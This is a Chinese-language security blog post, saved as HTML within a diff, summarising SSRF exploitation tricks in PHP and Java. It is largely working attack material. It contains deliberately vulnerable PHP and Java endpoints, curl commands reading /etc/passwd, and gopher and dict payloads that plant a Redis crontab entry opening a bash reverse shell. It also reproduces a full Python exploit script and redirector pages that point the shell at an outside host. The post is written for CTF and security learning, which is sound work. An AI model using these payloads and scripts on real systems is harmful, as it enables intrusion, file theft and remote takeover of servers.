@@ -1,0 +1,533 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,SSRF,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>SSRF Tricks小结 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        SSRF Tricks小结
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-02-29T15:53:30.000Z">
+        2020-02-29
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。</p>
+<h2 id="0x01-SSRF-in-PHP"><a href="#0x01-SSRF-in-PHP" class="headerlink" title="0x01 SSRF in PHP"></a>0x01 SSRF in PHP</h2><h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>在PHP中，涉及到SSRF漏洞的函数有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
+<p>其中有如下几个注意点：</p>
+<ul>
+<li>大部分PHP并不会开启fsockopen()的Gopher Wrapper；</li>
+<li>file_get_contents()的Gopher协议不能进行URLencode；</li>
+<li>file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；</li>
+<li>file_get_contents()支持php://input协议；</li>
+<li>curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；</li>
+<li>curl_exec()默认不跟踪跳转；</li>
+</ul>
+<p>curl_exec()造成的SSRF：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>
+<p>file_get_contents()造成的SSRF：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">'url'</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure>
+<p>fsockopen()造成的SSRF：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) </span><br><span class="line">        &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>在PHP中能够进行SSRF攻击利用的协议：</p>
+<ul>
+<li>http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；</li>
+<li>file：读取服务器上的任意文件内容；</li>
+<li>dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等；</li>
+<li>gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM；</li>
+<li>ftp/ftps：FTP匿名访问、爆破；</li>
+<li>tftp：UDP协议扩展，发送UDP报文；</li>
+<li>imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；</li>
+<li>telnet：SSH/Telnet匿名访问及爆破；</li>
+</ul>
+<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。</p>
+<p>可以通过<code>curl -V</code>命令查看curl版本及其支持的协议类型：</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/1.png" alt=""></p>
+<p>可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。</p>
+<p>注意：Windows使用curl命令需要把单引号换成双引号。</p>
+<h4 id="file-协议任意读文件"><a href="#file-协议任意读文件" class="headerlink" title="file://协议任意读文件"></a>file://协议任意读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;file:///etc/passwd&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/SSRF-Tricks小结/2.png" alt=""></p>
+<h4 id="dict-协议探测端口及banner信息"><a href="#dict-协议探测端口及banner信息" class="headerlink" title="dict://协议探测端口及banner信息"></a>dict://协议探测端口及banner信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/SSRF-Tricks小结/3.png" alt=""></p>
+<h4 id="gopher-协议反弹shell"><a href="#gopher-协议反弹shell" class="headerlink" title="gopher://协议反弹shell"></a>gopher://协议反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
+<p>当需要更换IP和端口时，命令中的<code>$57</code>需要同时更改，因为<code>$57</code>表示的是exp字符串长度为57个字节，上面的exp即<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a</code>这段字符串URL解码后的长度为57。</p>
+<p>这部分在下面的远程利用中会具体讲到。</p>
+<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><p>网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。</p>
+<p>s1.php，未做任何SSRF防御，且有回显：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用exp，比较简单，就不贴图了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.137/s1.php?url=file:///etc/passwd</span><br><span class="line">http://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/info</span><br><span class="line">http://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a</span><br><span class="line"></span><br><span class="line"># Windows下file://协议有点区别</span><br><span class="line">http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
+<p>s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。</p>
+<h4 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h4><p>Redis定时任务反弹shell语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h5 id="通过Gopher协议实现"><a href="#通过Gopher协议实现" class="headerlink" title="通过Gopher协议实现"></a>通过Gopher协议实现</h5><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>
+<p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。</p>
+<p>具体Gopher协议报文的构造可参考Joychou的博客：<a href="https://joychou.org/web/phpssrf.html#directory0418754728965590855" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0418754728965590855</a></p>
+<h5 id="通过Dict协议实现"><a href="#通过Dict协议实现" class="headerlink" title="通过Dict协议实现"></a>通过Dict协议实现</h5><p>这部分引用自：<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>
+<blockquote>
+<p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。</p>
+<p>利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">'104.224.151.234'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line">bhost = <span class="string">'www.4o4notfound.org'</span></span><br><span class="line">bport=<span class="number">2333</span></span><br><span class="line">vul_httpurl = <span class="string">'http://www.4o4notfound.org/ssrf.php?url='</span></span><br><span class="line">_location = <span class="string">'http://www.4o4notfound.org/302.php'</span></span><br><span class="line">shell_location = <span class="string">'http://www.4o4notfound.org/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format( host = host,</span><br><span class="line"> port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#set crontab command</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=</span></span><br><span class="line"><span class="string">&#123;bport&#125;'</span>.format( host = host, port = port, bhost = bhost, bport = bport)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(shell_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri </span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#confg set dir</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#config set dbfilename</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#save</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'</span>.format( host = host, port</span><br><span class="line"> = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$bhost = $_GET[<span class="string">'bhost'</span>];</span><br><span class="line">$bport = $_GET[<span class="string">'bport'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-</span></span><br><span class="line"><span class="string">i\\x20&amp;gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&amp;gt;\\x261\\x0a\\x0a\\x0a\""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。</p>
+</blockquote>
+<h4 id="攻击本地PHP-FPM"><a href="#攻击本地PHP-FPM" class="headerlink" title="攻击本地PHP-FPM"></a>攻击本地PHP-FPM</h4><p>SSRF打本地PHP-FPM在之前的博文中有讲过：<a href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/#0x05-SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM">《浅谈PHP-FPM安全》</a></p>
+<p>本次的Gopher协议攻击报文是直接通过脚本生成的。</p>
+<h2 id="0x02-SSRF-in-Java"><a href="#0x02-SSRF-in-Java" class="headerlink" title="0x02 SSRF in Java"></a>0x02 SSRF in Java</h2><h3 id="可利用的协议-1"><a href="#可利用的协议-1" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>由于Java没有PHP的cURL，因此不能像PHP一样可以通过<code>curl -V</code>来查看支持的协议，这里我们可以使用<code>import sun.net.www.protocol</code>来查看支持哪些协议：</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/4.png" alt=""></p>
+<p>可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。</p>
+<p>而实际上有攻击利用价值的仅为file和http/https协议。</p>
+<h3 id="SSRF相关类"><a href="#SSRF相关类" class="headerlink" title="SSRF相关类"></a>SSRF相关类</h3><p>Java中能发起网络请求的类：</p>
+<ul>
+<li>HttpClient类</li>
+<li>HttpURLConnection类</li>
+<li>URLConnection类</li>
+<li>URL类</li>
+<li>OkHttp类</li>
+<li>ImageIO类</li>
+<li>Request类</li>
+</ul>
+<p>注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute().returnContent().toString();</span><br></pre></td></tr></table></figure>
+<p>其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）：</p>
+<ul>
+<li>HttpClient类</li>
+<li>HttpURLConnection类</li>
+<li>OkHttp类</li>
+<li>Request类</li>
+</ul>
+<p>支持<code>sun.net.www.protocol</code>所有协议的类：</p>
+<ul>
+<li>URLConnection类</li>
+<li>URL类</li>
+<li>ImageIO类</li>
+</ul>
+<h3 id="漏洞示例代码"><a href="#漏洞示例代码" class="headerlink" title="漏洞示例代码"></a>漏洞示例代码</h3><p>本部分引自：<a href="https://pplsec.github.io/2018/09/19/JAVA代码审计之XXE与SSRF/" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p>
+<p>环境搭建可使用这个项目，这里就不演示了：<a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p>
+<h4 id="HttpURLConnection类"><a href="#HttpURLConnection类" class="headerlink" title="HttpURLConnection类"></a>HttpURLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HttpURLConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure>
+<h4 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//urlConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>
